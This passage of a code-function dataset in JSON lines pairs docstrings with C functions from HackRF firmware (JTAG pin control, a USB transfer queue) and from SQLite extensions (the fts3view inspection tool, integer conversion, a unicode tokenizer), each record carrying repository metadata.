"greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "/*****************************************************************************\n* Function:     initLenVal\n* Description:  Initialize the lenval array with the given value.\n*               Assumes lValue is less than 256.\n* Parameters:   plv         - ptr to lenval.\n*               lValue      - the value to set.\n* Returns:      void.\n*****************************************************************************/\n", "func_signal": "void initLenVal( lenVal*    plv,\n                 long       lValue )", "code": "{\n\tplv->len    = 1;\n\tplv->val[0] = (unsigned char)lValue;\n}", "path": "hackrf/firmware/common/xapp058/lenval.c", "commit_date": "2013-02-14 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "/* Place a transfer in the free list */\n", "func_signal": "static void free_transfer(usb_transfer_t* const transfer)", "code": "{\n        usb_queue_t* const queue = transfer->queue;\n        bool aborted;\n        do {\n                transfer->next = (void *) __ldrex((uint32_t *) &queue->free_transfers);\n                aborted = __strex((uint32_t) transfer, (uint32_t *) &queue->free_transfers);\n        } while (aborted);\n}", "path": "hackrf/firmware/common/usb_queue.c", "commit_date": "2013-09-17 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "/* waitTime:  Implement as follows: */\n/* REQUIRED:  This function must consume/wait at least the specified number  */\n/*            of microsec, interpreting microsec as a number of microseconds.*/\n/* REQUIRED FOR SPARTAN/VIRTEX FPGAs and indirect flash programming:         */\n/*            This function must pulse TCK for at least microsec times,      */\n/*            interpreting microsec as an integer value.                     */\n/* RECOMMENDED IMPLEMENTATION:  Pulse TCK at least microsec times AND        */\n/*                              continue pulsing TCK until the microsec wait */\n/*                              requirement is also satisfied.               */\n", "func_signal": "void waitTime(jtag_gpio_t* const gpio, long microsec)", "code": "{\n    static long tckCyclesPerMicrosec    = 1; /* must be at least 1 */\n    long        tckCycles   = microsec * tckCyclesPerMicrosec;\n    long        i;\n\n    /* This implementation is highly recommended!!! */\n    /* This implementation requires you to tune the tckCyclesPerMicrosec \n       variable (above) to match the performance of your embedded system\n       in order to satisfy the microsec wait time requirement. */\n    for ( i = 0; i < tckCycles; ++i )\n    {\n        pulseClock(gpio);\n    }\n}", "path": "hackrf/firmware/common/xapp058/ports.c", "commit_date": "2014-11-16 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "/* setPort:  Implement to set the named JTAG signal (p) to the new value (v).*/\n/* if in debugging mode, then just set the variables */\n", "func_signal": "void setPort(jtag_gpio_t* const gpio, short p, short val)", "code": "{\n\tif (p==TMS) {\n\t\tif (val)\n\t\t\tgpio_set(gpio->gpio_tms);\n\t\telse\n\t\t\tgpio_clear(gpio->gpio_tms);\n\t} if (p==TDI) {\n\t\tif (val)\n\t\t\tgpio_set(gpio->gpio_tdi);\n\t\telse\n\t\t\tgpio_clear(gpio->gpio_tdi);\n\t} if (p==TCK) {\n\t\tif (val)\n\t\t\tgpio_set(gpio->gpio_tck);\n\t\telse\n\t\t\tgpio_clear(gpio->gpio_tck);\n\t}\n\n\t/* conservative delay */\n\tdelay_jtag(20000);\n}", "path": "hackrf/firmware/common/xapp058/ports.c", "commit_date": "2014-11-16 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "/*\n** Print the content of a segment or of the root of a segdir.  The segment\n** or root is identified by azExtra[0].  If the first character of azExtra[0]\n** is 'r' then the remainder is the integer rowid of the %_segdir entry.\n** If the first character of azExtra[0] is not 'r' then, then all of\n** azExtra[0] is an integer which is the block number.\n**\n** If the --raw option is present in azExtra, then a hex dump is provided.\n** Otherwise a decoding is shown.\n*/\n", "func_signal": "static void showSegment(sqlite3 *db, const char *zTab)", "code": "{\n  const unsigned char *aData;\n  int nData;\n  sqlite3_stmt *pStmt;\n\n  pStmt = prepareToGetSegment(db, zTab, azExtra[0]);\n  if( sqlite3_step(pStmt)!=SQLITE_ROW ){\n    sqlite3_finalize(pStmt);\n    return;\n  }\n  nData = sqlite3_column_bytes(pStmt, 0);\n  aData = sqlite3_column_blob(pStmt, 0);\n  printf(\"Segment %s of size %d bytes:\\n\", azExtra[0], nData);\n  if( findOption(\"raw\", 0, 0)!=0 ){\n    printBlob(aData, nData);\n  }else{\n    decodeSegment(aData, nData);\n  }\n  sqlite3_finalize(pStmt);\n}", "path": "sqlite/ext/fts3/tool/fts3view.c", "commit_date": "2020-06-19 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/*\n** Convert text to a 64-bit integer\n*/\n", "func_signal": "static sqlite3_int64 atoi64(const char *z)", "code": "{\n  sqlite3_int64 v = 0;\n  while( z[0]>='0' && z[0]<='9' ){\n     v = v*10 + z[0] - '0';\n     z++;\n  }\n  return v;\n}", "path": "sqlite/ext/fts3/tool/fts3view.c", "commit_date": "2020-06-19 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/*\n** Report on the number and sizes of segments\n*/\n", "func_signal": "static void showSegmentStats(sqlite3 *db, const char *zTab)", "code": "{\n  sqlite3_stmt *pStmt;\n  int nSeg = 0;\n  sqlite3_int64 szSeg = 0, mxSeg = 0;\n  int nIdx = 0;\n  sqlite3_int64 szIdx = 0, mxIdx = 0;\n  int nRoot = 0;\n  sqlite3_int64 szRoot = 0, mxRoot = 0;\n  sqlite3_int64 mx;\n  int nLeaf;\n  int n;\n  int pgsz;\n  int mxLevel;\n  int i;\n\n  pStmt = prepare(db,\n                  \"SELECT count(*), sum(length(block)), max(length(block))\"\n                  \" FROM '%q_segments'\",\n                  zTab);\n  while( sqlite3_step(pStmt)==SQLITE_ROW ){\n    nSeg = sqlite3_column_int(pStmt, 0);\n    szSeg = sqlite3_column_int64(pStmt, 1);\n    mxSeg = sqlite3_column_int64(pStmt, 2);\n  }\n  sqlite3_finalize(pStmt);\n  pStmt = prepare(db,\n            \"SELECT count(*), sum(length(block)), max(length(block))\"\n            \"  FROM '%q_segments' a JOIN '%q_segdir' b\"\n            \" WHERE a.blockid BETWEEN b.leaves_end_block+1 AND b.end_block\",\n            zTab, zTab);\n  while( sqlite3_step(pStmt)==SQLITE_ROW ){\n    nIdx = sqlite3_column_int(pStmt, 0);\n    szIdx = sqlite3_column_int64(pStmt, 1);\n    mxIdx = sqlite3_column_int64(pStmt, 2);\n  }\n  sqlite3_finalize(pStmt);\n  pStmt = prepare(db,\n            \"SELECT count(*), sum(length(root)), max(length(root))\"\n            \"  FROM '%q_segdir'\",\n            zTab);\n  while( sqlite3_step(pStmt)==SQLITE_ROW ){\n    nRoot = sqlite3_column_int(pStmt, 0);\n    szRoot = sqlite3_column_int64(pStmt, 1);\n    mxRoot = sqlite3_column_int64(pStmt, 2);\n  }\n  sqlite3_finalize(pStmt);\n\n  printf(\"Number of segments....................... %9d\\n\", nSeg+nRoot);\n  printf(\"Number of leaf segments.................. %9d\\n\", nSeg-nIdx);\n  printf(\"Number of index segments................. %9d\\n\", nIdx);\n  printf(\"Number of root segments.................. %9d\\n\", nRoot);\n  printf(\"Total size of all segments............... %9lld\\n\", szSeg+szRoot);\n  printf(\"Total size of all leaf segments.......... %9lld\\n\", szSeg-szIdx);\n  printf(\"Total size of all index segments......... %9lld\\n\", szIdx);\n  printf(\"Total size of all root segments.......... %9lld\\n\", szRoot);\n  if( nSeg>0 ){\n    printf(\"Average size of all segments............. %11.1f\\n\",\n            (double)(szSeg+szRoot)/(double)(nSeg+nRoot));\n    printf(\"Average size of leaf segments............ %11.1f\\n\",\n            (double)(szSeg-szIdx)/(double)(nSeg-nIdx));\n  }\n  if( nIdx>0 ){\n    printf(\"Average size of index segments........... %11.1f\\n\",\n            (double)szIdx/(double)nIdx);\n  }\n  if( nRoot>0 ){\n    printf(\"Average size of root segments............ %11.1f\\n\",\n            (double)szRoot/(double)nRoot);\n  }\n  mx = mxSeg;\n  if( mx<mxRoot ) mx = mxRoot;\n  printf(\"Maximum segment size..................... %9lld\\n\", mx);\n  printf(\"Maximum index segment size............... %9lld\\n\", mxIdx);\n  printf(\"Maximum root segment size................ %9lld\\n\", mxRoot);\n\n  pStmt = prepare(db, \"PRAGMA page_size\");\n  pgsz = 1024;\n  while( sqlite3_step(pStmt)==SQLITE_ROW ){\n    pgsz = sqlite3_column_int(pStmt, 0);\n  }\n  sqlite3_finalize(pStmt);\n  printf(\"Database page size....................... %9d\\n\", pgsz);\n  pStmt = prepare(db,\n            \"SELECT count(*)\"\n            \"  FROM '%q_segments' a JOIN '%q_segdir' b\"\n            \" WHERE a.blockid BETWEEN b.start_block AND b.leaves_end_block\"\n            \"   AND length(a.block)>%d\",\n            zTab, zTab, pgsz-45);\n  n = 0;\n  while( sqlite3_step(pStmt)==SQLITE_ROW ){\n    n = sqlite3_column_int(pStmt, 0);\n  }\n  sqlite3_finalize(pStmt);\n  nLeaf = nSeg - nIdx;\n  printf(\"Leaf segments larger than %5d bytes.... %9d   %5.2f%%\\n\",\n         pgsz-45, n, nLeaf>0 ? n*100.0/nLeaf : 0.0);\n\n  pStmt = prepare(db, \"SELECT max(level%%1024) FROM '%q_segdir'\", zTab);\n  mxLevel = 0;\n  while( sqlite3_step(pStmt)==SQLITE_ROW ){\n    mxLevel = sqlite3_column_int(pStmt, 0);\n  }\n  sqlite3_finalize(pStmt);\n\n  for(i=0; i<=mxLevel; i++){\n    pStmt = prepare(db,\n           \"SELECT count(*), sum(len), avg(len), max(len), sum(len>%d),\"\n           \"       count(distinct idx)\"\n           \"  FROM (SELECT length(a.block) AS len, idx\"\n           \"          FROM '%q_segments' a JOIN '%q_segdir' b\"\n           \"         WHERE (a.blockid BETWEEN b.start_block\"\n                                       \" AND b.leaves_end_block)\"\n           \"           AND (b.level%%1024)==%d)\",\n           pgsz-45, zTab, zTab, i);\n    if( sqlite3_step(pStmt)==SQLITE_ROW\n     && (nLeaf = sqlite3_column_int(pStmt, 0))>0\n    ){\n      sqlite3_int64 sz;\n      nIdx = sqlite3_column_int(pStmt, 5);\n      printf(\"For level %d:\\n\", i);\n      printf(\"  Number of indexes...................... %9d\\n\", nIdx);\n      printf(\"  Number of leaf segments................ %9d\\n\", nLeaf);\n      if( nIdx>1 ){\n        printf(\"  Average leaf segments per index........ %11.1f\\n\",\n               (double)nLeaf/(double)nIdx);\n      }\n      printf(\"  Total size of all leaf segments........ %9lld\\n\",\n             (sz = sqlite3_column_int64(pStmt, 1)));\n      printf(\"  Average size of leaf segments.......... %11.1f\\n\",\n             sqlite3_column_double(pStmt, 2));\n      if( nIdx>1 ){\n        printf(\"  Average leaf segment size per index.... %11.1f\\n\",\n               (double)sz/(double)nIdx);\n      }\n      printf(\"  Maximum leaf segment size.............. %9lld\\n\",\n             sqlite3_column_int64(pStmt, 3));\n      n = sqlite3_column_int(pStmt, 4);\n      printf(\"  Leaf segments larger than %5d bytes.. %9d   %5.2f%%\\n\",\n             pgsz-45, n, n*100.0/nLeaf);\n    }\n    sqlite3_finalize(pStmt);\n  }\n}", "path": "sqlite/ext/fts3/tool/fts3view.c", "commit_date": "2020-06-19 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/*\n** Prepare an SQL query\n*/\n", "func_signal": "static sqlite3_stmt *prepare(sqlite3 *db, const char *zFormat, ...)", "code": "{\n  va_list ap;\n  char *zSql;\n  sqlite3_stmt *pStmt;\n  int rc;\n\n  va_start(ap, zFormat);\n  zSql = sqlite3_vmprintf(zFormat, ap);\n  va_end(ap);\n  rc = sqlite3_prepare_v2(db, zSql, -1, &pStmt, 0);\n  if( rc ){\n    fprintf(stderr, \"Error: %s\\nSQL: %s\\n\", sqlite3_errmsg(db), zSql);\n    exit(1);\n  }\n  sqlite3_free(zSql);\n  return pStmt;\n}", "path": "sqlite/ext/fts3/tool/fts3view.c", "commit_date": "2020-06-19 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/*\n** Show the top N largest segments\n*/\n", "func_signal": "static void listBigSegments(sqlite3 *db, const char *zTab)", "code": "{\n  int nTop, i;\n  sqlite3_stmt *pStmt;\n  sqlite3_int64 sz;\n  sqlite3_int64 id;\n\n  nTop = atoi(findOption(\"top\", 1, \"25\"));\n  printf(\"The %d largest segments:\\n\", nTop);\n  pStmt = prepare(db,\n            \"SELECT blockid, length(block) AS len FROM '%q_segments'\"\n            \" ORDER BY 2 DESC, 1\"\n            \" LIMIT %d\", zTab, nTop);\n  i = 0;\n  while( sqlite3_step(pStmt)==SQLITE_ROW ){\n    i++;\n    id = sqlite3_column_int64(pStmt, 0);\n    sz = sqlite3_column_int64(pStmt, 1);\n    printf(\"  %2d. %9lld size %lld\\n\", i, id, sz);\n  }\n  sqlite3_finalize(pStmt);\n}", "path": "sqlite/ext/fts3/tool/fts3view.c", "commit_date": "2020-06-19 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/*\n** Print the content of a doclist.  The segment or segdir-root is\n** identified by azExtra[0].  If the first character of azExtra[0]\n** is 'r' then the remainder is the integer rowid of the %_segdir entry.\n** If the first character of azExtra[0] is not 'r' then, then all of\n** azExtra[0] is an integer which is the block number.  The offset\n** into the segment is identified by azExtra[1].  The size of the doclist\n** is azExtra[2].\n**\n** If the --raw option is present in azExtra, then a hex dump is provided.\n** Otherwise a decoding is shown.\n*/\n", "func_signal": "static void showDoclist(sqlite3 *db, const char *zTab)", "code": "{\n  const unsigned char *aData;\n  sqlite3_int64 offset;\n  int nData;\n  sqlite3_stmt *pStmt;\n\n  offset = atoi64(azExtra[1]);\n  nData = atoi(azExtra[2]);\n  pStmt = prepareToGetSegment(db, zTab, azExtra[0]);\n  if( sqlite3_step(pStmt)!=SQLITE_ROW ){\n    sqlite3_finalize(pStmt);\n    return;\n  }\n  aData = sqlite3_column_blob(pStmt, 0);\n  printf(\"Doclist at %s offset %lld of size %d bytes:\\n\",\n         azExtra[0], offset, nData);\n  if( findOption(\"raw\", 0, 0)!=0 ){\n    printBlob(aData+offset, nData);\n  }else{\n    decodeDoclist(aData+offset, nData);\n  }\n  sqlite3_finalize(pStmt);\n}", "path": "sqlite/ext/fts3/tool/fts3view.c", "commit_date": "2020-06-19 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/*\n** Report on the vocabulary.  This creates an fts4aux table with a random\n** name, but deletes it in the end.\n*/\n", "func_signal": "static void showVocabulary(sqlite3 *db, const char *zTab)", "code": "{\n  char *zAux;\n  sqlite3_uint64 r;\n  sqlite3_stmt *pStmt;\n  int nDoc = 0;\n  int nToken = 0;\n  int nOccurrence = 0;\n  int nTop;\n  int n, i;\n\n  sqlite3_randomness(sizeof(r), &r);\n  zAux = sqlite3_mprintf(\"viewer_%llx\", zTab, r);\n  runSql(db, \"BEGIN\");\n  pStmt = prepare(db, \"SELECT count(*) FROM %Q\", zTab);\n  while( sqlite3_step(pStmt)==SQLITE_ROW ){\n    nDoc = sqlite3_column_int(pStmt, 0);\n  }\n  sqlite3_finalize(pStmt);\n  printf(\"Number of documents...................... %9d\\n\", nDoc);\n\n  runSql(db, \"CREATE VIRTUAL TABLE %s USING fts4aux(%Q)\", zAux, zTab);\n  pStmt = prepare(db, \n             \"SELECT count(*), sum(occurrences) FROM %s WHERE col='*'\",\n             zAux);\n  while( sqlite3_step(pStmt)==SQLITE_ROW ){\n    nToken = sqlite3_column_int(pStmt, 0);\n    nOccurrence = sqlite3_column_int(pStmt, 1);\n  }\n  sqlite3_finalize(pStmt);\n  printf(\"Total tokens in all documents............ %9d\\n\", nOccurrence);\n  printf(\"Total number of distinct tokens.......... %9d\\n\", nToken);\n  if( nToken==0 ) goto end_vocab;\n\n  n = 0;\n  pStmt = prepare(db, \"SELECT count(*) FROM %s\"\n                      \" WHERE col='*' AND occurrences==1\", zAux);\n  while( sqlite3_step(pStmt)==SQLITE_ROW ){\n    n = sqlite3_column_int(pStmt, 0);\n  }\n  sqlite3_finalize(pStmt);\n  printf(\"Tokens used exactly once................. %9d %5.2f%%\\n\",\n          n, n*100.0/nToken);\n\n  n = 0;\n  pStmt = prepare(db, \"SELECT count(*) FROM %s\"\n                      \" WHERE col='*' AND documents==1\", zAux);\n  while( sqlite3_step(pStmt)==SQLITE_ROW ){\n    n = sqlite3_column_int(pStmt, 0);\n  }\n  sqlite3_finalize(pStmt);\n  printf(\"Tokens used in only one document......... %9d %5.2f%%\\n\",\n          n, n*100.0/nToken);\n\n  if( nDoc>=2000 ){\n    n = 0;\n    pStmt = prepare(db, \"SELECT count(*) FROM %s\"\n                        \" WHERE col='*' AND occurrences<=%d\", zAux, nDoc/1000);\n    while( sqlite3_step(pStmt)==SQLITE_ROW ){\n      n = sqlite3_column_int(pStmt, 0);\n    }\n    sqlite3_finalize(pStmt);\n    printf(\"Tokens used in 0.1%% or less of docs...... %9d %5.2f%%\\n\",\n            n, n*100.0/nToken);\n  }\n\n  if( nDoc>=200 ){\n    n = 0;\n    pStmt = prepare(db, \"SELECT count(*) FROM %s\"\n                        \" WHERE col='*' AND occurrences<=%d\", zAux, nDoc/100);\n    while( sqlite3_step(pStmt)==SQLITE_ROW ){\n      n = sqlite3_column_int(pStmt, 0);\n    }\n    sqlite3_finalize(pStmt);\n    printf(\"Tokens used in 1%% or less of docs........ %9d %5.2f%%\\n\",\n            n, n*100.0/nToken);\n  }\n\n  nTop = atoi(findOption(\"top\", 1, \"25\"));\n  printf(\"The %d most common tokens:\\n\", nTop);\n  pStmt = prepare(db,\n            \"SELECT term, documents FROM %s\"\n            \" WHERE col='*'\"\n            \" ORDER BY documents DESC, term\"\n            \" LIMIT %d\", zAux, nTop);\n  i = 0;\n  while( sqlite3_step(pStmt)==SQLITE_ROW ){\n    i++;\n    n = sqlite3_column_int(pStmt, 1);\n    printf(\"  %2d. %-30s %9d docs %5.2f%%\\n\", i,\n      sqlite3_column_text(pStmt, 0), n, n*100.0/nDoc);\n  }\n  sqlite3_finalize(pStmt);\n\nend_vocab:\n  runSql(db, \"ROLLBACK\");\n  sqlite3_free(zAux);\n}", "path": "sqlite/ext/fts3/tool/fts3view.c", "commit_date": "2020-06-19 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/* \n** Read a 64-bit variable-length integer from memory starting at p[0].\n** Return the number of bytes read, or 0 on error.\n** The value is stored in *v.\n*/\n", "func_signal": "int getVarint(const unsigned char *p, sqlite_int64 *v)", "code": "{\n  const unsigned char *q = p;\n  sqlite_uint64 x = 0, y = 1;\n  while( (*q&0x80)==0x80 && q-(unsigned char *)p<9 ){\n    x += y * (*q++ & 0x7f);\n    y <<= 7;\n  }\n  x += y * (*q++);\n  *v = (sqlite_int64) x;\n  return (int) (q - (unsigned char *)p);\n}", "path": "sqlite/ext/fts3/tool/fts3view.c", "commit_date": "2020-06-19 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/*\n** tointeger(X):  If X is any value (integer, double, blob, or string) that\n** can be losslessly converted into an integer, then make the conversion and\n** return the result.  Otherwise, return NULL.\n*/\n", "func_signal": "static void tointegerFunc(\n  sqlite3_context *context,\n  int argc,\n  sqlite3_value **argv\n)", "code": "{\n  assert( argc==1 );\n  (void)argc;\n  switch( sqlite3_value_type(argv[0]) ){\n    case SQLITE_FLOAT: {\n      double rVal = sqlite3_value_double(argv[0]);\n      sqlite3_int64 iVal = (sqlite3_int64)rVal;\n      if( rVal==(double)iVal ){\n        sqlite3_result_int64(context, iVal);\n      }\n      break;\n    }\n    case SQLITE_INTEGER: {\n      sqlite3_result_int64(context, sqlite3_value_int64(argv[0]));\n      break;\n    }\n    case SQLITE_BLOB: {\n      const unsigned char *zBlob = sqlite3_value_blob(argv[0]);\n      if( zBlob ){\n        int nBlob = sqlite3_value_bytes(argv[0]);\n        if( nBlob==sizeof(sqlite3_int64) ){\n          sqlite3_int64 iVal;\n          if( TOTYPE_BIGENDIAN ){\n            int i;\n            unsigned char zBlobRev[sizeof(sqlite3_int64)];\n            for(i=0; i<sizeof(sqlite3_int64); i++){\n              zBlobRev[i] = zBlob[sizeof(sqlite3_int64)-1-i];\n            }\n            memcpy(&iVal, zBlobRev, sizeof(sqlite3_int64));\n          }else{\n            memcpy(&iVal, zBlob, sizeof(sqlite3_int64));\n          }\n          sqlite3_result_int64(context, iVal);\n        }\n      }\n      break;\n    }\n    case SQLITE_TEXT: {\n      const unsigned char *zStr = sqlite3_value_text(argv[0]);\n      if( zStr ){\n        int nStr = sqlite3_value_bytes(argv[0]);\n        if( nStr && !totypeIsspace(zStr[0]) ){\n          sqlite3_int64 iVal;\n          if( !totypeAtoi64((const char*)zStr, &iVal, nStr) ){\n            sqlite3_result_int64(context, iVal);\n          }\n        }\n      }\n      break;\n    }\n    default: {\n      assert( sqlite3_value_type(argv[0])==SQLITE_NULL );\n      break;\n    }\n  }\n}", "path": "sqlite/ext/misc/totype.c", "commit_date": "2020-01-07 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/*\n** Return true if the p->aiException[] array contains the value iCode.\n*/\n", "func_signal": "static int unicodeIsException(unicode_tokenizer *p, int iCode)", "code": "{\n  if( p->nException>0 ){\n    int *a = p->aiException;\n    int iLo = 0;\n    int iHi = p->nException-1;\n\n    while( iHi>=iLo ){\n      int iTest = (iHi + iLo) / 2;\n      if( iCode==a[iTest] ){\n        return 1;\n      }else if( iCode>a[iTest] ){\n        iLo = iTest+1;\n      }else{\n        iHi = iTest-1;\n      }\n    }\n  }\n\n  return 0;\n}", "path": "sqlite/ext/fts3/fts3_unicode.c", "commit_date": "2019-01-08 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/*\n** Show the table schema\n*/\n", "func_signal": "static void showSchema(sqlite3 *db, const char *zTab)", "code": "{\n  sqlite3_stmt *pStmt;\n  pStmt = prepare(db,\n            \"SELECT sql FROM sqlite_schema\"\n            \" WHERE name LIKE '%q%%'\"\n            \" ORDER BY 1\",\n            zTab);\n  while( sqlite3_step(pStmt)==SQLITE_ROW ){\n    printf(\"%s;\\n\", sqlite3_column_text(pStmt, 0));\n  }\n  sqlite3_finalize(pStmt);\n  pStmt = prepare(db, \"PRAGMA page_size\");\n  while( sqlite3_step(pStmt)==SQLITE_ROW ){\n    printf(\"PRAGMA page_size=%s;\\n\", sqlite3_column_text(pStmt, 0));\n  }\n  sqlite3_finalize(pStmt);\n  pStmt = prepare(db, \"PRAGMA journal_mode\");\n  while( sqlite3_step(pStmt)==SQLITE_ROW ){\n    printf(\"PRAGMA journal_mode=%s;\\n\", sqlite3_column_text(pStmt, 0));\n  }\n  sqlite3_finalize(pStmt);\n  pStmt = prepare(db, \"PRAGMA auto_vacuum\");\n  while( sqlite3_step(pStmt)==SQLITE_ROW ){\n    const char *zType = \"???\";\n    switch( sqlite3_column_int(pStmt, 0) ){\n      case 0:  zType = \"OFF\";         break;\n      case 1:  zType = \"FULL\";        break;\n      case 2:  zType = \"INCREMENTAL\"; break;\n    }\n    printf(\"PRAGMA auto_vacuum=%s;\\n\", zType);\n  }\n  sqlite3_finalize(pStmt);\n  pStmt = prepare(db, \"PRAGMA encoding\");\n  while( sqlite3_step(pStmt)==SQLITE_ROW ){\n    printf(\"PRAGMA encoding=%s;\\n\", sqlite3_column_text(pStmt, 0));\n  }\n  sqlite3_finalize(pStmt);\n}", "path": "sqlite/ext/fts3/tool/fts3view.c", "commit_date": "2020-06-19 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/*\n** Destroy a tokenizer allocated by unicodeCreate().\n*/\n", "func_signal": "static int unicodeDestroy(sqlite3_tokenizer *pTokenizer)", "code": "{\n  if( pTokenizer ){\n    unicode_tokenizer *p = (unicode_tokenizer *)pTokenizer;\n    sqlite3_free(p->aiException);\n    sqlite3_free(p);\n  }\n  return SQLITE_OK;\n}", "path": "sqlite/ext/fts3/fts3_unicode.c", "commit_date": "2019-01-08 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/*\n** Convert zNum to a 64-bit signed integer.\n**\n** If the zNum value is representable as a 64-bit twos-complement\n** integer, then write that value into *pNum and return 0.\n**\n** If zNum is exactly 9223372036854665808, return 2.  This special\n** case is broken out because while 9223372036854665808 cannot be a\n** signed 64-bit integer, its negative -9223372036854665808 can be.\n**\n** If zNum is too big for a 64-bit integer and is not\n** 9223372036854665808  or if zNum contains any non-numeric text,\n** then return 1.\n**\n** The string is not necessarily zero-terminated.\n*/\n", "func_signal": "static int totypeAtoi64(const char *zNum, sqlite3_int64 *pNum, int length)", "code": "{\n  sqlite3_uint64 u = 0;\n  int neg = 0; /* assume positive */\n  int i;\n  int c = 0;\n  int nonNum = 0;\n  const char *zStart;\n  const char *zEnd = zNum + length;\n\n  while( zNum<zEnd && totypeIsspace(*zNum) ) zNum++;\n  if( zNum<zEnd ){\n    if( *zNum=='-' ){\n      neg = 1;\n      zNum++;\n    }else if( *zNum=='+' ){\n      zNum++;\n    }\n  }\n  zStart = zNum;\n  while( zNum<zEnd && zNum[0]=='0' ){ zNum++; } /* Skip leading zeros. */\n  for(i=0; &zNum[i]<zEnd && (c=zNum[i])>='0' && c<='9'; i++){\n    u = u*10 + c - '0';\n  }\n  if( u>LARGEST_INT64 ){\n    *pNum = SMALLEST_INT64;\n  }else if( neg ){\n    *pNum = -(sqlite3_int64)u;\n  }else{\n    *pNum = (sqlite3_int64)u;\n  }\n  if( (c!=0 && &zNum[i]<zEnd) || (i==0 && zStart==zNum) || i>19 || nonNum ){\n    /* zNum is empty or contains non-numeric text or is longer\n    ** than 19 digits (thus guaranteeing that it is too large) */\n    return 1;\n  }else if( i<19 ){\n    /* Less than 19 digits, so we know that it fits in 64 bits */\n    assert( u<=LARGEST_INT64 );\n    return 0;\n  }else{\n    /* zNum is a 19-digit numbers.  Compare it against 9223372036854775808. */\n    c = totypeCompare2pow63(zNum);\n    if( c<0 ){\n      /* zNum is less than 9223372036854775808 so it fits */\n      assert( u<=LARGEST_INT64 );\n      return 0;\n    }else if( c>0 ){\n      /* zNum is greater than 9223372036854775808 so it overflows */\n      return 1;\n    }else{\n      /* zNum is exactly 9223372036854775808.  Fits if negative.  The\n      ** special case 2 overflow if positive */\n      assert( u-1==LARGEST_INT64 );\n      assert( (*pNum)==SMALLEST_INT64 );\n      return neg ? 0 : 2;\n    }\n  }\n}", "path": "sqlite/ext/misc/totype.c", "commit_date": "2020-01-07 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/*\n** Functions to convert between blobs and floats.\n*/\n", "func_signal": "static void ieee754func_from_blob(\n  sqlite3_context *context,\n  int argc,\n  sqlite3_value **argv\n)", "code": "{\n  UNUSED_PARAMETER(argc);\n  if( sqlite3_value_type(argv[0])==SQLITE_BLOB\n   && sqlite3_value_bytes(argv[0])==sizeof(double)\n  ){\n    double r;\n    const unsigned char *x = sqlite3_value_blob(argv[0]);\n    unsigned int i;\n    sqlite3_uint64 v = 0;\n    for(i=0; i<sizeof(r); i++){\n      v = (v<<8) | x[i];\n    }\n    memcpy(&r, &v, sizeof(r));\n    sqlite3_result_double(context, r);\n  }\n}", "path": "sqlite/ext/misc/ieee754.c", "commit_date": "2020-07-18 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/* \n** End of generic command line parser.\n*************************************************************************/\n", "func_signal": "static void abort_due_to_error(int rc)", "code": "{\n  fprintf(stderr, \"Error: %d\\n\");\n  exit(-1);\n}", "path": "sqlite/ext/session/session_speed_test.c", "commit_date": "2019-01-08 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
{"docstring": "/*\n** Look for a command-line argument.\n*/\n", "func_signal": "const char *findOption(const char *zName, int hasArg, const char *zDefault)", "code": "{\n  int i;\n  const char *zResult = zDefault;\n  for(i=0; i<nExtra; i++){\n    const char *z = azExtra[i];\n    while( z[0]=='-' ) z++;\n    if( strcmp(z, zName)==0 ){\n      int j = 1;\n      if( hasArg==0 || i==nExtra-1 ) j = 0;\n      zResult = azExtra[i+j];\n      while( i+j<nExtra ){\n        azExtra[i] = azExtra[i+j+1];\n        i++;\n      }\n      break;\n    }\n  }\n  return zResult;       \n}", "path": "sqlite/ext/fts3/tool/fts3view.c", "commit_date": "2020-06-19 00:00:00", "repo_name": "sqlite/sqlite", "stars": 5247, "license": "other", "language": "c", "size": 369540}
